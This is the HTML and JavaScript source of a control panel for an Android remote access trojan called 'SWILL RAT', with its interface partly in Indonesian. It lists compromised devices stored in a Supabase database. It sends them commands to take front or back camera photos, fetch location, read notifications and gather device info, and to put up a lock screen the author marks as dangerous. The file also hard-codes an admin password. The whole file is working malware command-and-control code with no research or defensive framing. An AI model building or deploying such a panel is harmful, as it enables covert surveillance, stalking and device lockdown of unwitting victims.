<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
    <title>SWILL RAT Panel</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { 
            font-family: 'Segoe UI', 'Roboto', monospace; 
            background: #0a0a0a; 
            color: #00ff00; 
            padding: 16px; 
            min-height: 100vh;
        }
        .container { max-width: 600px; margin: 0 auto; }
        .login-container, .panel { 
            background: #1a1a1a; 
            border: 2px solid #00ff00; 
            border-radius: 16px; 
            padding: 24px 20px; 
            margin: 20px 0; 
            box-shadow: 0 0 20px rgba(0,255,0,0.2);
        }
        h2 { font-size: 1.5rem; margin-bottom: 20px; text-align: center; letter-spacing: 2px; }
        h3 { font-size: 1.2rem; margin: 15px 0 10px; }
        input, button, select, textarea { 
            background: #000; 
            border: 1px solid #00ff00; 
            border-radius: 12px;
            color: #00ff00; 
            padding: 14px 16px; 
            margin: 8px 0; 
            font-family: monospace;
            font-size: 1rem;
            width: 100%;
            outline: none;
        }
        button { 
            cursor: pointer; 
            font-weight: bold;
            transition: all 0.2s;
        }
        button:hover { background: #00ff00; color: #000; }
        .device-card { 
            background: #0f0f0f;
            border: 1px solid #00ff00; 
            border-radius: 12px;
            padding: 14px; 
            margin: 10px 0; 
        }
        .device-card strong { font-size: 1.1rem; display: block; margin-bottom: 8px; }
        .device-card button { 
            width: auto; 
            padding: 8px 16px; 
            margin-top: 10px; 
            background: #1a1a1a;
        }
        .result-area { 
            background: #000; 
            border-radius: 12px;
            padding: 14px; 
            margin-top: 16px; 
            white-space: pre-wrap; 
            word-break: break-all;
            max-height: 400px;
            overflow-y: auto;
            font-size: 0.85rem;
        }
        .hidden { display: none; }
        .status-badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 20px;
            font-size: 0.7rem;
            font-weight: bold;
        }
        .locked-yes { background: #ff0000; color: #fff; }
        .locked-no { background: #008800; color: #fff; }
        select { appearance: none; background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%2300ff00' stroke-width='2'><polyline points='6 9 12 15 18 9'/></svg>"); background-repeat: no-repeat; background-position: right 16px center; }
        @media (max-width: 480px) {
            body { padding: 12px; }
            .login-container, .panel { padding: 18px 16px; }
            h2 { font-size: 1.3rem; }
            input, button, select { padding: 12px 14px; font-size: 0.9rem; }
        }
    </style>
</head>
<body>
<div class="container" id="app">
    <div id="loginPanel" class="login-container">
        <h2>HALO WORD</h2>
        <input type="password" id="password" placeholder="Password" autocomplete="off">
        <button onclick="login()">⏎ Login</button>
    </div>
    
    <div id="adminPanel" class="panel hidden">
        <h2>🎮 SWILL CONTROL</h2>
        <div id="devicesList"></div>
        <div id="commandPanel">
            <h3>📡 Kirim Perintah</h3>
            <select id="deviceSelect">
                <option value="">-- Pilih Device --</option>
            </select>
            <select id="commandSelect">
                <option value="capture_front_cam">📷 Front Camera</option>
                <option value="capture_back_cam">📸 Back Camera</option>
                <option value="get_location">📍 Get Location</option>
                <option value="get_device_info">📱 Device Info</option>
                <option value="show_lockdown">🔒 Lock Screen (BERBAHAYA)</option>
                <option value="hide_lockdown">🔓 Unlock Screen</option>
                <option value="get_notifications">🔔 Get Notifications</option>
            </select>
            <button onclick="sendCommand()">⚡ EXECUTE</button>
        </div>
        <div id="results" class="result-area">
            <span style="color:#555">Menunggu hasil...</span>
        </div>
    </div>
</div>

<script>
    // ========== BACA ENVIRONMENT VARIABLE DARI VERCEL ==========
    // Gunakan window.__ENV atau fallback ke placeholder (aman untuk GitHub)
    const SUPABASE_URL = window.__ENV?.SUPABASE_URL || "https://YOUR_PROJECT.supabase.co";
    const SUPABASE_ANON_KEY = window.__ENV?.SUPABASE_ANON_KEY || "YOUR_ANON_KEY";
    const ADMIN_PASSWORD = "dhex230703";
    
    let supabase;
    let currentDeviceId = null;
    let devicesRefreshInterval = null;
    let resultsRefreshInterval = null;
    
    function login() {
        const pwd = document.getElementById('password').value;
        if (pwd === ADMIN_PASSWORD) {
            document.getElementById('loginPanel').classList.add('hidden');
            document.getElementById('adminPanel').classList.remove('hidden');
            initSupabase();
            loadDevices();
            if (devicesRefreshInterval) clearInterval(devicesRefreshInterval);
            if (resultsRefreshInterval) clearInterval(resultsRefreshInterval);
            devicesRefreshInterval = setInterval(loadDevices, 5000);
            resultsRefreshInterval = setInterval(checkResults, 3000);
        } else {
            alert("❌ Wrong password");
        }
    }
    
    function initSupabase() {
        if (!SUPABASE_URL || SUPABASE_URL === "https://YOUR_PROJECT.supabase.co") {
            console.warn("⚠️ Gunakan ENV Vercel: SUPABASE_URL dan SUPABASE_ANON_KEY");
        }
        supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
    }
    
    async function loadDevices() {
        if (!supabase) return;
        const { data, error } = await supabase.from('devices').select('*').order('last_seen', { ascending: false });
        if (error) {
            console.error(error);
            return;
        }
        
        const devicesDiv = document.getElementById('devicesList');
        const deviceSelect = document.getElementById('deviceSelect');
        
        if (!data || data.length === 0) {
            devicesDiv.innerHTML = '<div class="device-card" style="color:#888">Belum ada device terhubung</div>';
            deviceSelect.innerHTML = '<option value="">-- Tidak ada device --</option>';
            return;
        }
        
        devicesDiv.innerHTML = data.map(d => `
            <div class="device-card">
                <strong>📱 ${d.device_name || 'Unknown'}</strong>
                <div>🤖 Android: ${d.android_version || '-'}</div>
                <div>🕒 Last Seen: ${new Date(d.last_seen).toLocaleString()}</div>
                <div>🔒 Locked: <span class="status-badge ${d.is_locked ? 'locked-yes' : 'locked-no'}">${d.is_locked ? 'ACTIVE' : 'OFF'}</span></div>
                <button onclick="selectDevice('${d.id}')">🎯 Select Device</button>
            </div>
        `).join('');
        
        deviceSelect.innerHTML = '<option value="">-- Pilih Device --</option>' + 
            data.map(d => `<option value="${d.id}">${d.device_name || d.id.slice(0,8)}</option>`).join('');
    }
    
    function selectDevice(id) {
        currentDeviceId = id;
        const deviceName = [...document.querySelectorAll('.device-card')].find(card => card.innerHTML.includes(id))?.querySelector('strong')?.innerText || id.slice(0,8);
        alert(`✅ Device selected: ${deviceName}`);
    }
    
    async function sendCommand() {
        const deviceId = document.getElementById('deviceSelect').value || currentDeviceId;
        const command = document.getElementById('commandSelect').value;
        
        if (!deviceId) {
            alert("⚠️ Pilih device terlebih dahulu!");
            return;
        }
        
        const { error } = await supabase.from('commands').insert({
            device_id: deviceId,
            command: command,
            status: 'pending',
            created_at: new Date().toISOString()
        });
        
        if (error) {
            alert("❌ Error: " + error.message);
        } else {
            alert("✅ Command terkirim ke device");
        }
    }
    
    async function checkResults() {
        if (!supabase) return;
        const { data, error } = await supabase.from('commands')
            .select('*')
            .eq('status', 'done')
            .order('executed_at', { ascending: false })
            .limit(10);
        
        if (error) return;
        
        const resultsDiv = document.getElementById('results');
        if (!data || data.length === 0) {
            resultsDiv.innerHTML = '<span style="color:#555">✨ Belum ada hasil command</span>';
            return;
        }
        
        resultsDiv.innerHTML = data.map(cmd => `
            <div style="border-bottom:1px solid #00ff00; margin:10px 0; padding-bottom:10px;">
                <strong>⚙️ ${cmd.command}</strong> <span style="color:#aaa; font-size:0.7rem;">${cmd.device_id?.slice(0,8)}</span><br>
                📦 Result: <pre style="margin-top:6px; background:#111; padding:8px; border-radius:8px; overflow-x:auto;">${JSON.stringify(cmd.result, null, 2)}</pre>
            </div>
        `).join('');
    }
    
    // Optional: inject environment dari Vercel via __ENV (akan di-set saat build)
    if (typeof window.__ENV === 'undefined') {
        window.__ENV = {};
    }
    // Untuk development lokal, bisa diisi manual, tapi tidak disarankan commit ke GitHub
</script>
</body>
</html>
```
